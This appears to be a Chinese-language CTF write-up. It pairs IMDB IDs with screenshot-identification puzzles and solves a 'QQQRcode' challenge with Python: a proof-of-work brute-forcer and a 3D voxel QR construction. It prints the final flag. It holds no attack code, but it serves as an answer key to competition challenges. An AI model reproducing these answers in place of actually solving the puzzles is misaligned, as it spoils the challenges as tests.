![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404528.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404529.png)

IMDB: tt0110912（checked)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404530.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404531.png)

IMDB: tt8893624(checked)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404532.png)

IMDB: tt0368226(checked)

影片：the room



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404533.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404534.png)

IMDB: tt31309480(checked)

ぽんのみち

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404535.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404536.png)

tt0103767(checked)

影片Baraka

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404537.png)

#### HARD（3/5）

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404538.png)

IMDB: tt0043306

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404539.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404540.png)

IMDB: tt5004766（checked)

就是Birdboy里面的

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404541.png)

IMDB: tt0109688



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404542.png)



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404543.png)

IMDB:tt26471411

是韩剧：苦尽柑来遇见你



### QQQRcode | Solved

验证爆破

```python
def proof(io):
    io.recvuntil(b"XXXX+")
    suffix = io.recv(16).decode("utf8")
    io.recvuntil(b"== ")
    cipher = io.recvline().strip().decode("utf8")
    for i in itertools.product(string.ascii_letters + string.digits, repeat=4):
        x = "{}{}{}{}".format(i[0], i[1], i[2], i[3])
        proof = hashlib.sha256(
            (x + suffix.format(i[0], i[1], i[2], i[3])).encode()
        ).hexdigest()
        if proof == cipher:
            break
    print(suffix, cipher, x)
    io.sendlineafter(b"XXXX:", x.encode())
```

这道题要求做一个三维的二维码（21\*21\*21），要求从三视图看，分别解码出Azure，Assassin，Alliance。
我一开始先令所有方块都是True，然后按照三个面去除一定不要的（有点像雕刻）。

但这样的方块数太多了，直接干到1500了，题目要求390以内。

穷举减方块，可以减就减，如果减了不对，就还原。

```python

def make_data(front, left, top):
    data = [[[True for _ in range(21)] for _ in range(21)] for _ in range(21)]
    for x in range(21):
        for y in range(21):
            if not front[x][y]:
                for z in range(21):
                    data[x][y][z] = False

    for y in range(21):
        for z in range(21):
            if not left[y][z]:
                for x in range(21):
                    data[x][y][z] = False

    for x in range(21):
        for z in range(21):
            if not top[x][z]:
                for y in range(21):
                    data[x][y][z] = False

    if not check_data(data):
        return None

    for x in range(21):
        for y in range(21):
            for z in range(21):
                if data[x][y][z]:
                    data[x][y][z] = False
                    if not check_data(data):
                        data[x][y][z] = True
        print(x, check_data(data), end="\r")
    print()
    # print(data)
    return data
```

这个parse有点坑，按zyx的顺序来的

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205404544.png)

```plain&#x20;text
give me your data:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000100000000000001000000000000010000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000100000000000000000000000000000000000000000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000001000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000010000000100000000000000000000000000010000000000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000010000000000000000000000000000000000010000000000000000000000000000000000001000000000000000000000000000000000000000001000000000000000000001000000000000000000001000000000000000000000000000000000000000001000000000000000000000000000000000000000
000000000000100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000001000000000000000000000000000100000000000000000000100000000000000000000000101110100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000100000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000100000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000010100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000010000000000000000000000000000000000000000000000000000000000100000010000000000100000000100000000000000000000000000000000000000000000000000000000000000000000000000001001000000000000000000000001000000000000000000000010000000001000000000000000000000000000001000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000010000000000000000001000000000000000000000000000000000000000001000000000000000000001000000000000000000000000000001000000000000000000000000100000100000000000000000000000010000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001000000000000000000001000000000000000000001000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000011000000000001000000000000000000000001000000000000000000001000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000010000100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000010000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000010000000000000100000100000000000000000000010000000010001000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000001000000000000000000001000000000000000000000000000000110000100100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000100000000000000000001000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000110000000000000000000000000000000000000000000000000000000000100000000001000000100000000000000000000000000100000000000000000000000000000000000000000100100000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000100000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000010000000010000000000000000001000101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000001000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000110000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000101100100000000000000000000000000000000100000000000000000000000000000000001000000100000000000010000000100000000000010000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000100000000000000000000000000100000000000100000000000000000000000000000000000001000000010000000000000000000000000000000000000000100000000000000000000000000000000010000000000000010000000000000000000000000010001000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001001000000000000000000000000001100000000010000000000000000000000001000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000001000000000000000010000000000000000000000000000000000000000010000100000000000000010000100000000000101110100100000010000000000000100000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000000000000000000010000000010000000000000000000000000000000000000101100100000000000000000000000000000000000000000000000000000000
ACTF{QQQRCode_is_iiint3r3st1ng}
```

ACTF{QQQRCode\_is\_iiint3r3st1ng}
